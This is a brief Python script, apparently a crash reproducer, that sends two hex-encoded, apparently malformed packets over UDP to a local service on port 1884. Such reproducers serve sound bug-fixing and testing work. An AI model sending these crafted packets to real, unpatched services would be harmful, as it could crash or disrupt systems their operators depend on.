import socket

payload = ["10040801eedf7331617a38726d306c37", "0d0c21eb2be38feed77d4a24b4"]

def reproducer(payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    for message in payload:
        message = bytes.fromhex(message)
        sock.sendto(message, ("127.0.0.1", 1884))
    
    sock.close()

reproducer(payload)